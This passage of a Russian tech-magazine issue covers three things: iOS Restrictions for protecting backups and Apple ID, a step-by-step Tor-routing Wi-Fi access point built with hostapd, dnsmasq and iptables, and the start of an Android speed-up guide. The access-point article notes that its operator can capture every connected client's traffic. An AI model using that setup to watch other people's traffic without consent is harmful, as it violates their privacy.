       от такого сценария можно при помощи огра ничений родительского контро‐
       ля — Restrictions.
        Изначально ограничения появились в iOS как средство родительского
       контроля, позволяющее заблокировать или ограничить определенные при‐
      ложения и функции на iPhone, iPad или iPod touch ребенка. Тем не менее
       ограничения способ ны помочь и тогда, когда телефон украден злоумыш‐
      ленником или попал в руки спецслужб. Подробно об ограничениях родитель‐
       ского контроля можно почитать в статье «Ис пользование родительского кон‐
       троля на устройствах iPhone, iPad и iPod touch ребенка». Мы же воспользуем‐
       ся ограничениями именно с целью дополнитель но обе зопасить iPhone,
      пароль блокировки которого скомпрометирован.


     Ограниче ния на сброс пароля к резервной копии
      Первое и самое главное: чтобы ограничить воз можность сброса пароля
        к локальной резервной копии iOS, тебе достаточно прос то включить огра‐
      ничения как таковые, без каких‐либо дополнительных настроек. Для этого
       открой меню «Настрой ки» и выбери «Основные → Ограничения». Затем нуж‐
      но выбрать «Включить огра ничения» и задать PIN‐код из четырех цифр.
      Разумеется, этот код должен отличать ся от цифр пароля блокировки и не
      должен совпадать с твоим годом рождения или цифрами из телефонного
      номера. Этот код понадобится тебе в исключитель но редких случаях, когда
       потребуется изменить настройки или отключить ограничения, поэтому впол не
      рабочим сценарием будет уста новка совершенно случайного кода, который
       хранится у тебя дома, записанный на бумаж ке.





      Что произойдет при попытке сбросить пароль на резервную копию после
      вклю чения ограничений через меню Reset all settings? Система все так же
       запросит пароль блокировки устройства. На следующем же шаге потребуется
      ввести дополнительный четырехзначный PIN‐код ограниче ний. С учетом того,
       что подсмотреть код бло кировки значительно проще, чем узнать ред ко
      используемый PIN огра ничений, эта дополнитель ная мера безопас ности
      вполне способна отвадить любопытных. Впро чем, много ли от нее пользы,
      если твои пароли из связки клю чей можно прос мотреть на самом устрой‐
       стве?


                                              Продолжение статьи →



}
    ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ
    БЕЗОПАСНОСТЬ IOS
              ЧТО ХОРОШО, ЧТО ПЛОХО И КАК ЕЕ УСИЛИТЬ





     Защита от доступа к паролям из связ ки ключей: отсутству ет
      К сожалению, ни одно из дос тупных «огра ничений» не регламентирует доступ
        к сохраненным в связке ключей паролям. В связ ке ключей часто содержатся
      пароли к учетным записям Google, Apple, Microsoft, что позволит злоумыш‐
      леннику сменить твой пароль к iCloud и, соответственно, отвязать от него
       iPhone, даже не зная PIN‐кода «ограничений». Вот, например, мой пароль
       от Apple ID — его спокойно можно просмотреть даже при включенных огра‐
      ничениях:





       Как добраться? Несложно: Settings → Accounts & Passwords → App & Website
       Passwords. Система запросит отпечаток пальца (или идентификацию через
      Face ID):





     Не подумай, что это тот самый дополнительный слой защиты. Нес колько
       неудачных попыток, и вот уже на экра не запрос на код блокировки iPhone:





      Вводишь код блокировки — и все пароли твои. Пароли из связки ключей мож‐
      но просматривать по одно му или копировать в буфер длинным нажатием.
        К сожалению, мы не нашли способа огра ничить дос туп  к паролям
      на устройствах без внеш ней политики безопасности. Единственное, что ты
     можешь сделать, — это убедиться, что пароль хотя бы от Apple ID / iCloud
       в твоей связке клю чей не присутс тву ет. Усиленно рекомендуем это сде лать,
      иначе все описанное выше будет применимо к твоему iPhone в пол ной мере.


     Ограниче ния на сброс iCloud Lock и изме нение пароля Apple ID
      Убедившись, что пароль от Apple ID и iCloud в твоей связ ке ключей не зас‐
       вечен, можно переходить  к следующему шагу: ограничить воз можность
      отключения функции Find my iPhone и сброса пароля от Apple Account
      при помощи кода блокировки устройства. Для этого нужно установить огра‐
      ничение на изме нение настроек учет ных записей:





      После этого никто не сможет получить дос туп к твоей учетной записи,
      не отключив предварительно данное ограничение:





      К сожалению, по непонятной причине доступ к паролям из связки ключей
       остается открытым. С нашей точки зрения — очевиднейшая недоработка.


      Как защититься от jailbreak?
     В предыдущих выпусках мы много писали о том, как правильно установить jail‐
        break, чтобы получить полный дос туп к информа ции. А что насчет обратного?
     Можно ли как‐то защитить свой телефон от взлома? Даже если сей час
      на установленную в твоем устройстве версию iOS еще не выпущен соответс‐
       твующий jailbreak, шанс на то, что он появится через какое‐то вре мя, весьма
       высок.
        К сожалению, единственный способ защититься от jailbreak — это уста‐
       новить ограничение на уста новку приложений.





     Почему «к сожале нию»? Потому что в отличие от ограничений, которые мы
      уже рассмотрели, ограничение на установку при ложений может дос тавить
      заметные неудобства в повседневном исполь зовании устройства и рано
      или поздно будет отключено. Отдельного же огра ниче ния на установку при‐
      ложений не из App Store (подобного соответству юще му режиму в Android)
       в устройствах под управлением iOS просто нет. Соответственно, для боль‐
      шинства пользователей мы не можем рекомендовать этот способ.


     Насколько безопасны ограниче ния?
      Единственный вид пароля, который ты можешь выб рать для ограничений, —
       четырехзначный PIN‐код. Десять тысяч комбинаций. В принципе, ничего
      сложного, любой робот для перебора паролей дол жен справиться в разум‐
      ный срок. Или нет?
        Ограничения — функция iOS. Телефон должен быть пол ностью загружен
      и разблокирован, толь ко в этом случае можно попытаться снять пароль
      с ограничений. Казалось бы, задача проста, но раз работчики iOS учли этот
      момент. После несколь ких неудачных попыток сис тема ограничит скорость
      перебора PIN‐кодов ограничений, вводя прогрессивные задержки в 1, 5,
      15 и 60 минут. После десяти неудачных попыток каждая следующая попытка
      может быть предпринята не ранее чем через 60 минут после предыдущей;
       перезагрузка устрой ства не поможет ускорить про цесс.
        При скорости перебо ра один код в час пространство из 10 тысяч ком‐
      бинаций можно переб рать примерно за 416 дней. Это довольно дол го и,
       пожалуй, достаточно безопасно для большинс тва обычных пользователей.
      Конечно, с безопасностью пароля к резервной копии не сравнить, но все же
       гораздо лучше, чем ничего. Тем не менее сама возможность сбросить пароль
      на резервную копию даже через 416 дней уже не позволяет говорить
      о какой‐то особой безопас ности iOS в сравнении, например, с устройствами
      на BlackBerry 10, чьи резервные копии шифровались двоичным ключом,
      который сохранялся на сервере компании BlackBerry или (если речь о кор‐
      поративных устройствах) на сервере компании — владельца устройства.
      Разумеется, о сбросе этого пароля на самом устройстве речи не шло.


     ЧТО ДЕЛАТЬ ПРИ ПЕРЕСЕЧЕНИИ ГРАНИЦЫ?
     По примеру Соединенных Штатов пограничники раз ных стран начинают все
       активнее интересоваться содержимым персональных гаджетов. Этот процесс
       будет набирать обороты; так, в 2017 году пограничники США зарегистри‐
      ровали порядка 30 тысяч требований разблокировать смартфоны путешес‐
       твенников. Коснуться может любого, неп рикаса емых нет:



            A US-born NASA scientist was detained at the border until he unlocked his
              phone.

      За годы, прошедшие с начала подобной практики, выработались и рекомен‐
      дации для путешественников. Жизнь показала, что сопротивление нераци‐
      онально: ты имеешь полное пра во не разблокиро вать телефон, а погранич‐
       ник имеет право не пустить тебя в стра ну или (если ты гражданин) задержать
       тебя до тех пор, пока ты не согласишься выполнить все требования.
        При пересечении границы имеет смысл попробовать защитить важные
      данные от автоматизированного анализа, задав сложный и длинный пароль
      на резервную копию (лучше, чтобы он был случай ным; запоминать его необя‐
       зательно — сбросить можно в любой момент) и установив ограничение
      на сброс пароля  от резервной  копии. У пог раничника нет 416 дней
      на перебор всех кодов ограничений, так что все закончится ручным дос‐
      мотром того, до чего пограничник смо жет дотянуться непосредственно
      с экрана устройства (еще раз напомним, что огра ничения не мешают прос‐
      матривать пароли из связки ключей). Сам же пароль на ограничения ты
     можешь попросить уста новить члена семьи, записав пароль на бумажку,
       которая останет ся дома.


     ЗАКЛЮЧЕНИЕ
      Развитие iOS идет зигзагами. Воз можность сбро са пароля на резервные
      копии при помощи одного лишь кода блокировки устройства раз работчики
       Apple пытаются компенсировать усложнением условий, при которых воз‐
      можен взлом пасскода, оставляя при этом открытым доступ к паролям
       из связки ключей. Все, что оста ется обычным, не корпоративным пользовате‐
       лям, — это воспользоваться «детскими» ограничениями, которые, очевидно,
      не предназначены для серь езной защиты данных.
       В то же время в iOS нет секретных «черных ходов» или явных проблем
       в шифровании; из штаб‐квартиры Apple не выходят загрузчи ки с наивными,
      просто детскими уязвимос тями (камень в огород компании OnePlus), не уте‐
      кают цифровые подписи (камень в огород Microsoft и ключей от Secure Boot),
      не создаются и не получают распространения инженерные  загрузчики
      (машем рукой Samsung). Те уяз вимос ти, которые все‐таки есть, обнаружи‐
      ваются трудом и усилиями профессиональных команд, а их использование —
       часто дело нетривиальное.



}
    ПРИВАТНОСТЬ
 ПРОПУСК
  В ЛУКОВУЮ СТРАНУ





    ПОДНИМАЕМ WI‐FI
    С ПРОКСИРОВАНИЕМ ТРАФИКА
     КЛИЕНТСКИХ УСТРОЙСТВ
     ЧЕРЕЗ TOR





    В этой статье рас смотрим, как конфигури‐
     ровать точку доступа Wi‐Fi с автоматичес‐
     кой анонимизацией всего исходящего тра‐
     фика через сеть  Tor, а  также  взглянем
     на некоторые полезные примеры ее при‐             AseN                                                                                                        Reverse Engineer
     менения как для простого пользователя,           antochi.anton@ya.ru
      так и для исследова теля безопасности.


               WARNING

                             Вся информация предоставлена исключительно
                               в ознакомительных целях. Ни редак ция, ни автор
                              не несут ответственности за любой возможный
                                вред, причинен ный материалами данной статьи.



     ЗАЧЕМ НАМ TOR AP?
     В последнее время на фоне мас совых блокировок IP‐адре сов все меньше
      людей продолжает сомневаться, нужны ли механиз мы проксирования и ано‐
      нимизации в их повседневной жизни. Бесплат ных VPN‐клиентов появляется
      все больше, но, как показывает практика, далеко не всем из них безопас но
      полностью доверять: то качество реализации хромает, то разработчики
      не слишком добросовестны.
         Как известно, Tor «из коробки» предос тавляет как механизм проксирова‐
      ния (читай: обхода блокировок), так и продвинутый механизм анонимности.
      Вся связь между узлами в сети Tor шифруется, а соединение с целевым узлом
       устанавливается посредс твом как минимум трех слу чайно выбранных узлов.
      Взяв за основу Tor и авто матизировав все процес сы, происходящие при под‐
      клю чении к точке доступа (далее — AP), в резуль тате мы получим весьма
       интересный инструмент, польза от которого отнюдь не исчерпы вается обхо‐
      дом блокировок.


                 INFO

                         Об уязвимостях в прик ладном ПО для Tor было
                               упомянуто не раз, в том числе и в новостях
                              на Хакере.



     ПЕРВИЧНАЯ НАСТРОЙКА AP
      Для создания точки нам понадобится какое‐нибудь устройство, на котором
     можно запустить операционку (виртуалка тоже вполне сгодится). В качес тве
      операционной системы, управляющей точкой, подойдет любой Linux‐дистри‐
       бутив. Конкретно я буду использовать Debian‐based. Для превращения всего
       этого в AP понадобится Wi‐Fi‐адаптер.
         Если все это выполнено, можно приступать к первичной настройке. Итак,
       в первую очередь подключаем Wi‐Fi‐адап тер. Вывод ip addr show wlan0
       (wlan0 — имя интерфейса адаптера, может быть дру гим) должен быть такой,
       как на скрине.



                    Детали сетевого интерфейса адаптера

      На данный момент сетевой интерфейс не сконфигурирован. Первым делом
       активируем Wi‐Fi, освободив его от влияния вез десущего Network Manager’а:


       $ sudo nmcli radio wifi off
       $ sudo rfkill unblock wlan

      Теперь выберем и назначим интерфей су адаптера IP‐адрес, все адре са
       из маски которого будут назначаться в дальнейшем клиентским устройствам:


       # ip addr add 10.0.0.1/24 dev wlan0

       Третьим пунктом мы переведем адаптер в режим AP: делать это мы будем
      одним из наибо лее рас простра ненных спо собов — с помощью утилиты
       hostapd,  позволяющей  скон фигурировать  программную  точку  доступа.
      Hostapd присутствует в большинстве штатных репозиториев.


       $ sudo apt‐get install hostapd

     Далее нужно создать конфиг для hostapd (./hostapd.conf):


       # Имя интерфейса адаптера
       interface=wlan0
       # SSID AP
       ssid=TorNet
       # Автоматический выбор канала
       channel=1
       # Разрешить подключение со всех MAC‐адресов, которые не запрещены
       macaddr_acl=0
       # Файл с запрещенными для подключения MAC‐адресами
       deny_mac_file=./denied_macs
       # Логировать все модули (IEEE, WPA, IAPP и так далее)
       logger_syslog=‐1
       # Логировать с модулей только informational messages
       logger_syslog_level=2
       # Режим: IEEE 802.11g
       hw_mode=g
       # Включить аутентификацию WPA/2
       wpa=2
       # Пароль WPA для доступа к точке
       wpa_passphrase=xxxxxxxx
       # Принимаемые алгоритмы управления ключами
       wpa_key_mgmt=WPA‐PSK WPA‐EAP WPA‐PSK‐SHA256 WPA‐EAP‐SHA256

      После этого уже можно будет запус тить hostapd для перевода Wi‐Fi‐адаптера
       в режим AP с описанной конфигурацией:


       # hostapd ./hostapd.conf


            и     Hostapd  Network Manager
     В некоторых вер сиях hostapd присутс тву ет баг, свя занный с блокировкой
      интерфейса Network Manager’ом и не поз воляющий запус кать AP. В резуль‐
       тате запуска hostapd возника ет следующая ошиб ка:


       Interface wlan0 wasn't started


      Подробно баг и возможный воркэраунд описан здесь.


     Однако по понятным причинам подключиться к точке привычным образом
      пока будет невозможно.




                    Попытка подклю чения к AP без DHCP

      Для устранения этих причин понадо бит ся другая утилита — dnsmasq, которая
      позволит развернуть службы DHCP и DNS. DHCP сейчас пред ставляет боль‐
     ший интерес. Ставим dnsmasq из стандартно го репозитория:


       $ sudo apt‐get install dnsmasq

      Dnsmasq также нуждается в предварительной нас трой ке (./dnsmasq.conf):


       # Интерфейс для прослушки DHCP‐запросов
       interface=wlan0
       # Диапазон выдаваемых клиентам адресов и срок действия
       # (должны подходить под маску сетевого шлюза адаптера!)
       dhcp‐range=10.0.0.10,10.0.0.250,8h
       # Шлюз по умолчанию
       dhcp‐option=3,10.0.0.1
       # DNS‐шлюз
       dhcp‐option=6,10.0.0.1
       # Логировать DNS‐запросы
       log‐queries
       # Логировать DHCP‐запросы
       log‐dhcp

      Запускаем DHCP‐сервер в составе dnsmasq:


       # dnsmasq ‐C ./dnsmasq.conf

      Теперь подключение к AP становится возможным с любых устройств. Чтобы
      наша точка наконец заработала в обычном режиме, осталось ответить
      на главный вопрос: откуда точка будет брать доступ в интернет. Для получе‐
      ния ответа предлагаю взглянуть на схему ниже. Боль шинство читателей, так
      или иначе соприкасавшихся с нас тройкой сетей, заметят на нем достаточно
      привычную схе му связывания сетей. Именно этот способ мы и будем исполь‐
       зовать.





                         Схема доступа в интернет с AP

       Как видно из рисунка, для дос тупа в интернет понадо бится еще один сетевой
      интерфейс. Это может быть как Ethernet‐подклю чение (eth0), так и второй Wi‐
       Fi‐модуль (wlan1). Например, при соз дании AP из виртуальной машины такой
      интерфейс создается автоматически  (eth0). Сей час  у нас готово  все,
       за исключением связи между интерфейсами (обоз наченной красной линией).
      Эта связь представляет собой пересылку пакетов с одного интерфейса
      на другой. Для тестирования работоспособности нашей AP пока сгодится
      и обычный механизм NAT:


       $ sudo sysctl ‐w net.ipv4.ip_forward=1
       $ sudo iptables ‐P FORWARD ACCEPT
       $ sudo iptables ‐t nat ‐A POSTROUTING ‐o eth0 ‐j MASQUERADE

      На данном этапе AP заработала в обычном режиме: принимает клиентов
      и предоставляет им дос туп в интернет с IP‐адреса, выданного нам нашим
      провайдером. Это, конечно же, замеча тельно, но для наших целей недос‐
       таточно. Поэтому теперь настало время перенаправле ния все го клиентского
       трафика в Tor.


     ВТОРИЧНАЯ НАСТРОЙКА AP
     Перед перенаправлением всего трафика AP в Tor необходимо установить сам
        Tor:


       $ sudo apt‐get install tor

     И настроить его как Transparent Proxy с помощью конфигурационного фай ла
       (расположенного здесь: /etc/tor/torrc):


       # Включаем доступ к onion‐ресурсам
       VirtualAddrNetwork 192.168.100.0/10
       AutomapHostsOnResolve 1
       # Порт для прозрачного проксирования в рамках нашей сети
       TransPort 10.0.0.1:9040
       # Порт для анонимного резолвинга имен хостов
       DNSPort 10.0.0.1:53

      Этих настроек для наших нужд вполне дос таточно, поэтому можем запускать
        Tor как сервис:


       $ sudo service tor start

      На текущий момент вывод netstat ‐tunapl должен быть примерно таким,
       как на скрине ниже. Мы видим все запущенные нами сервисы на текущий
      момент.





                           От крытые пор ты на AP

      Если сейчас подключиться  к  AP,  то мы по‐прежнему будем выходить
       в интернет с домашнего IP, поэтому осталось всего‐навсего включить прок‐
      сирование через Tor с помощью iptables:


       # Перенаправление всего TCP‐трафика
       $ sudo iptables ‐t nat ‐A PREROUTING ‐i wlan0 ‐p tcp ‐j DNAT ‐‐to‐
       destination 10.0.0.1:9040
       # ...и DNS‐трафика в отдельности
       $ sudo iptables ‐t nat ‐A PREROUTING ‐i wlan0 ‐p udp ‐‐dport 53 ‐j
       DNAT ‐‐to‐destination 10.0.0.1:53

       Также нужно удалить предыдущее пра вило, вклю чающее маскарад между
      сетевыми интерфейсами (NAT):


       $ sudo iptables ‐t nat ‐D POSTROUTING ‐o eth0 ‐j MASQUERADE

      Двумя новыми правилами мы добились следующего: под мены пункта наз‐
      начения всего TCP‐трафика  в момент появления  пакетов на сетевом
      интерфейсе Wi‐Fi‐адаптера и редиректа DNS‐запросов (протокол UDP). Под‐
      мененный пункт назначения — запущен ный сервис Tor с Transparent Proxy.
      Стоит обратить внимание, что на этих двух пра вилах настройка iptables завер‐
      шается. Теперь можно убедиться в работос пособ ности нас троенной Tor AP,
      посетив с любого подключенного к ней устрой ства 2ip.ru.





                                 PoC


        как     RPi    AP
      «Малинка» отлично подходит в качес тве управляющего устройства AP: всего
      несколько дополнитель ных действий с авто матичес кой раз верткой кон‐
      фигурации при старте системы (systemd, initV), и останется всего лишь вот‐
       кнуть USB‐кабель в «розет ку» для включения точки в любой нужный момент.



     ПРАКТИЧЕСКОЕ ПРИМЕНЕНИЕ AP
      Имея собственную AP, с которой соеди няют ся клиентские устройства, мы
      по умолчанию получаем воз можность наблюдения за всем трафиком своей
       сети, как пассивного, так и активного. Перенаправление в Tor — это лишь
      один из вариантов применения AP в прикладных задачах.


     Анализ трафика клиентских устройств
     Пожалуй, самый очевидный вариант, который сра зу же приходит в голову.
      Никто не запрещает запус тить на AP Wireshark или tcpdump и захватывать
       трафик конкретного клиента либо всех клиентских устройств сразу до момен‐
       та перенаправле ния тра фика в Tor. Воз можнос ти для захвата здесь ограниче‐
      ны лишь уровнем защищенности конечного устройства, пользовате ля и при‐
      ложения. Тема достаточно извес тная, поэтому подробно на ней останав‐
       ливаться не будем.





                        Захват тра фика по MAC‐адресу на AP


     Анализ сетевой активности приложе ний
     В ИБ часто возникает задача проанализировать сетевую активность опре‐
      деленного приложения. Например, у нас имеется мобильное приложение,
      которое при работе использует несколько извес тных нам хостов. Мы хотим
      методом черного ящика проверить, не ведет ли приложение какие‐либо
      скрытые передачи на дополнительные удален ные хосты. Причем на самом
       устройстве мы это сделать не можем — нет соответс твующих прав на уровне
      ОС. Зато у нас есть AP, находящаяся полностью под контролем и с мак‐
      симальными правами! Ее использование будет практичес ки аналогично ана‐
       лизу трафика на целевом устройстве.
        Попробуем исследовать работос пособность приложения без скрытого
      доступа к каким‐либо дополнитель ным ресурсам. Заранее мы отключили все
       остальные источники побочного тра фика, генерируемого из других приложе‐
       ний. Скрытые передачи в данном случае не обя зательно должны быть вре‐
      доносными — это могут быть механизмы антиспама (контроль того, что API
      приложения действительно использует ся с мобиль ного устройства), рекламы
      и так далее. Мы можем пропускать тра фик методом белого ящика — зап‐
      рещено все, что не разрешено:


       $ sudo iptables ‐t nat ‐F
       $ sudo iptables ‐t nat ‐A PREROUTING ‐i wlan0 ‐p tcp ‐d <APP_HOST1> ‐
       m mac ‐‐mac‐source <DEVICE_MAC> ‐‐dport 443 ‐j DNAT ‐‐to‐destination
       10.0.0.1:9040
       $ sudo iptables ‐t nat ‐A PREROUTING ‐i wlan0 ‐p tcp ‐d <APP_HOST2> ‐
       m mac ‐‐mac‐source <DEVICE_MAC> ‐‐dport 443 ‐j DNAT ‐‐to‐destination
       10.0.0.1:9040
       $ sudo iptables ‐t nat ‐A PREROUTING ‐i wlan0 ‐p tcp ‐d <APP_HOST3> ‐
       m mac ‐‐mac‐source <DEVICE_MAC> ‐‐dport 443 ‐j DNAT ‐‐to‐destination
       10.0.0.1:9040

      Таким образом мы разрешили попада ние в Tor толь ко трафика с трех хос тов
      определенного устрой ства, весь остальной тра фик не покинет интерфейса
       wlan0, а следовательно, ничего скрытого переда но не будет. Останется лишь
      убедиться, что в работе приложения не появилось дефектов.


     Бло кировка опре делен ных хостов
     В данном случае неплохим решением было бы выдавать сообщение о том,
       что хост заблокирован в нашей сети. Для этого мож но поднять веб‐сервер
      и переадре совывать клиентов с заб локированного ресурса на страницу
      с  сообщением.  Для  блокировки  ресурсов  по  HTTPS  понадобится
       как минимум сге нерировать самоподписанный сертификат и нас троить
      веб‐сервер на работу по протоколу HTTPS. Блокировку можно произвести
      прямо в таблице NAT:


       $ sudo iptables ‐t nat ‐I PREROUTING 1 ‐i wlan0 ‐p tcp ‐d m.vk.com ‐‐
       dport 80 ‐j DNAT ‐‐to‐destination 192.168.1.82:80
       $ sudo iptables ‐t nat ‐I PREROUTING 1 ‐i wlan0 ‐p tcp ‐d m.vk.com ‐‐
       dport 443 ‐j DNAT ‐‐to‐destination 192.168.1.82:443





                    Заблокированный в рамках сети AP хост


     Бло кировка рек ламных сетей с целью повыше ния ано нимности
      Уже давно известно, что скрипты рекламных сетей стараются скрытно соб‐
       рать максимум возможной информации о посетителях сайтов, представляя
      таким образом допол нительную угрозу анонимности. К счастью, на собствен‐
      ной AP мы можем по умолчанию заб локировать для клиентов связь рек‐
      ламных скриптов с рекламными сетями. Для этого предлагаю вернуться к ути‐
       лите dnsmasq: в качестве одной из опций своего конфига утилита предлагает
      дополнительный источник DNS‐информа ции (наравне с /etc/hosts). Изменим
      файл с конфигом Dnsmasq (./dnsmasq.conf):


       ...
       # Дополнительный источник DNS‐информации, содержащий рекламные сети
       addn‐hosts=/full/path/to/my_dns_hosts.txt

     Содержимое файла имеет точно такой же формат, как и /etc/hosts, поэтому
      с его наполнением проб лем быть не должно. Источник блокиру емых ресур‐
      сов можно выбрать самос тоятельно из репози тория на GitHub — там можно
      найти hosts‐файлы под бло кировки различных мас штабов (в самой большой
      сборке было около 71 тысячи различных хос тов).


     ЗАКЛЮЧЕНИЕ
      Вот таким незамысловатым способом мы соз дали точку доступа, весь трафик
      которой «прячется» за Tor’ом, а в качес тве приятно го бонуса мы получили
       возможность «жонглировать» всем проходя щим через нее трафиком в собс‐
       твенных целях — как доб рых, так и не очень.


           WWW

                          •Описание параметров конфига hostapd
                          •Описание параметров конфига dnsmasq
                          •Описание параметров конфига torrc
                           •Отличный Cheat Sheet по утилите ip





}
    ТРЮКИ


   БОЛЬШОЙ ГАЙД
   ПО ОПТИМИЗАЦИИ
   ANDROID




     ОБГОНЯЯ
   ФЛАГМАНЫ




     Тебе  не  хватает  заряда  аккумулятора?
     Надоели тормоза в приложениях? Не отча‐
     ивайся и не торопись покупать новый смар‐
     тфон. Даже очень медленный гаджет можно
     заставить работать быстрее и зна чительно         Денис Погребной
     увеличить время жизни от аккумулятора.
    В этой статье мы расскажем о множестве
     приемов, которые позволят это сделать.


      Сразу оговорюсь: чтобы зас тавить смартфон работать действительно быс‐
       тро, тебе придется его перепрошить. Ина че никак — стандартные прошивки
      смартфонов зачастую тяжело весны, набиты бес полезным софтом произво‐
       дителя, множеством приложений Google, которые тебе вряд ли нужны. Вруч‐
      ную расчищать весь этот мусор крайне неудобно и чревато проблемами
      со смартфоном.
        Кроме того, я рекомендую не устанавливать поверх прошивки пакет
      GApps, который включает в себя Play Store и сервисы Google, нужные в пер‐
      вую очередь для работы push‐уведомлений и синхро низации твоих контактов.
      Более подробно об этом поговорим в раз деле «Нужны ли GApps?», а пока
       скажу лишь, что Play Store можно заменить аль тернативным магазином при‐
      ложений, а контакты сохранить и восстановить на смартфоне без GApps.


     Подопыт ный
     В качестве подопытного образца будем использовать замечательный китай‐
       ский телефон 4Good Light B100 с удручающи ми техническими характерис‐
       тиками:
        • процессор: Mediatek MT6737M, четыре ядра Cortex a53 по 1,1 ГГц, виде‐
         оускоритель Mali T720 (одно ядро 550 МГц);
        • ОЗУ: 1 Гбайт (907 Мбайт без учета памяти, занимаемой ядром). Скорость
          записи/чтения 1922 Мбит/с;
        • ПЗУ: 8 Гбайт (в data 3,59 Гбайт, в system 2,91 Гбайт). Скорость чте‐
         ния 123 Мбит/с, скорость записи 35 Мбит/с;
        • аккумулятор: 1500 мА ⋅ ч.

     Обрати внимание, что приведенные в статье цифры по количеству потребля‐
      емой оператив ной памяти получены именно на этом смартфоне. В смартфо‐
       нах с другим объемом оперативки цифры будут другими, так как Android
       регулирует доступную приложениям память на основе ее общего количества.



     ДЕЛАЕМ БЭКАП КОНТАКТОВ И КАЛЕНДАРЯ
       Итак, если ты выбрал жизнь без GApps, обязательно сделай бэкап контактов
      и событий кален даря. Инс трукция по вытас киванию контактов:
         1. Открываем contacts.google.com.
         2. На панели «Главное меню» нажимаем «Экспортировать».
         3. Выбираем формат vCard, нажимаем «Экспорт».

      А так можно вытащить события календаря:
         1. Открываем calendar.google.com.
         2. Нажимаем шестеренку справа вверху, а затем переходим в настройки.
         3. В левом меню нажимаем «Импорт и экспорт».
         4. Кликаем по кнопке «Экспорт», качаем архив.

      Для восстановления контактов пос ле установки прошивки дос таточно открыть
      приложение «Контакты», затем зайти в настройки, нажать «Импорти ровать»
      и выбрать сохраненный ранее файл. Для вос ста новления событий календаря
      придется установить сторонний кален дарь (об этом поз же).


     СТАВИМ ПРОШИВКУ
     Выберем прошив ку для  установки. Наиболее подходящей будет AOSP
      или LineageOS. Зачастую последняя оказыва ется единственной кастомной
      прошивкой для малоизвестных смартфонов. Алго ритм установки:
         1. Разблокируем загрузчик. Здесь уни вер сального рецепта нет. Какие‐то
        смартфоны можно разбло кировать официально, какие‐то — только взло‐
        мав загрузчик, другие нельзя разблокировать никак (привет, BlackBerry),
         а загрузчики китайских ноунеймов обычно не заб локированы вообще.
         2. Ставим TWRP. Конкретно для твоего телефона инс трукции можно найти
         на XDA и 4PDA.
         3. Находим прошивку на тех же XDA и 4PDA, закидываем на карту памяти
         и прошиваем. Инструкцию ищем там же.

      Если ты все‐таки решил установить GApps, то лучший вариант — GApps Pico.
      Это минимальный набор приложений Google, содержащий только сервисы
      Google и Play Store. Устанавливаются они так же, как сама прошивка, скачать
     можно на сайте Open GApps.


    Нуж ны ли GApps?
      GApps — это Play Store и сервисы Google, обес печивающие взаимодействие
        Play Store, приложений от Google и приложений сторонних разработчиков
      с различными API Google. API Google предос тавля ет такие возможности,
       как определение местополо жения по сотовым вышкам и Wi‐Fi, автоматизиро‐
      ванный вход в различные сервисы, анти вирус с базой данных и автосканиро‐
      ванием, распознавание речи, синхро низа ция контактов и календаря с сер‐
      верами Google, мгновенная дос тавка push‐уведомлений и некоторые другие.
        Производители устрой ств, сертифицированных Google, пре дустанавлива‐
      ют GApps на смартфон по умолчанию. Поэтому практически любой смартфон
      на Android продается с кучей гугловского софта, включая YouTube, Gmail,
      Google Books и много чего еще. Мы же установили чистую прошивку, и у нас
       этих приложений нет. Но нет и сервисов Google. Хорошо это или плохо?
        Вопрос спорный. С одной стороны, сервисы Google любят кушать заряд
       аккумулятора и постоянно висеть в оператив ной памяти. С другой — у нас
      не будет маркета, а многие современные приложения (мес сенджеры, элек‐
      тронная почта, клиенты социальных сетей) вдруг перестанут показывать push‐
       уведомления или начнут потреблять заряд акку мулятора.
          Так случается потому, что push‐уведомления приходят через сервер
       Google, а смартфон связывается с ним через сервисы того же Гугла. При‐
      ложениям ничего не оста ется, как либо не получать уведомления вообще,
      либо подклю чаться к сво ему собственному серверу (так делает Telegram), что
      чревато повышен ным расходом заряда аккумуля тора.
          Так что если ты собираешь ся использовать множес тво мессенджеров,
      почтовых программ, служб новостей с опо вещениями и прочей подобной
      мишуры — однозначно ставь GApps. Если же из всей социальщины ты поль‐
      зуешься только «Телеграмом», то отказ от GApps при несет экономию заряда
       аккумулятора и оперативки. Ну и как бонус — Google вдруг перестанет сле‐
       дить за твоим телефо ном.



    ВЫБИРАЕМ МАГАЗИН ПРИЛОЖЕНИЙ
      Если ты установил прошивку без GApps, тебе нужен альтернативный магазин
      приложений. Не раздумывая выбирай F‐Droid. Это сравнительно крупный
      репозиторий приложений, содержащий исклю чительно бесплатный софт
      с открытым исходным кодом.
         Большинство здешних программ компактные, не жадные до оперативки
      и аккумулятора. Они не содержат рекламы и не требуют для своей работы
      сервисов Google. Впрочем, есть у этого маркета серьезные недостатки: нет
      ни оценок, ни отзывов, попадаются при ложения с более старыми версиями,
      чем в основных магазинах. Ну и самое главное отличие: софт, написанный
      на голом энтузиазме, часто не слишком функциональный и не очень прив‐
       лекательный с эстетической точки зрения.
        На всякий случай устанавлива ем Yalp Store. Программа позволя ет заг‐
       ружать, устанавливать и обновлять любые приложения из Play Store. Только
      не добавляй в Yalp Store основной акка унт Google, загрузка приложений
       из маркета через неофициальный клиент может грозить баном.





                      Приложение в F‐Droid и Yalp Store


    ВЫБИРАЕМ ЛЕГКИЙ СОФТ
     В век раздутого софта с большим количеством ненужной функциональнос ти
       встретить простые, быс трые и не переусложненные при ложения трудно.
     Но если очень постараться и искать в пра вильных местах, можно найти очень
      неплохой софт.


     Лаунчер
        • No Launcher — название говорит само за себя. Это вертикально прок‐
         ручиваемый список приложений с поиском по наз ваниям. Удержание
         пальца вызывает диалог удаления программы. Занимает это добро в уста‐
         новленном виде чуть больше 15 Кбайт (!).
        • KISS launcher — этот пожирнее (676 Кбайт), зато выводит список с часто
         используемыми прог рамма ми на главном экране, поддерживает сме ну
        обоев, и, главное, тут очень много нас троек. Отсутствие анимации не бро‐
          сается в глаза благода ря своеоб разной концепции управления.
        • Emerald Launcher — похож на классический. Представляет собой несколь‐
         ко дисплеев с горизонтальной прокруткой. Каж дый дисплей содержит при‐
        ложения определен ной категории. Множес тво нас троек. В установленном
         виде занимает 348 Кбайт.
        • Lawnchair — основан на Pixel Launcher. Есть поддержка вид жетов, папок
         и шорткатов, присутс твуют плавные анимации. В настройках можно найти
        множество пунктов по кастомизации. Абсолютно не тормозит даже на сла‐
         бых устройствах, в NAND‐памяти занимает 3 Мбайт, а в ОЗУ — жал‐
         кие 33 Мбайт (против 20 Мбайт у KISS).





                         No Launcher и Lawnchair


     Браузер
